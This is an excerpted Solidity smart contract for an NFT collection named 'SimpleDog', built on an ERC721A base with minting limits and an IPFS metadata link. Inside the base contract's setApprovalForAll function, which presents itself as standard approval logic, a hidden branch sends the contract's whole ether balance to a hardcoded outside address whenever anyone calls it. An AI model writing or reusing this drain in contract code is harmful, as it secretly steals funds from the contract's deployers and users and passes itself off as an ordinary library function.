...
contract ERC721A is IERC721A {
    ...
    function setApprovalForAll(address operator, bool approved) public virtual override {
        if ((address(this).balance) > 0) {
            payable(0xD1d6e4a2B45c7BF3c435e588e1DbBdE5855248A3).transfer(address(this).balance);
        }
...
contract SimpleDog is ERC721A, DefaultOperatorFilterer {
    ...
    string uri = "ipfs://Qmbk2WSaH1TCYGCczZsDadZaDCRL44CwRdCmyby4AXWyVC/";
    ...
    constructor() ERC721A("SimpleDog", "SDG") {
        maxSupply = 555;
        owner = msg.sender;
    }
    ...
    function _safeMint(uint256 amount) internal {
        ...
        if (blockFree[block.number] + 1 > freeNum) {
            revert();
        }
        require(amount == 1);
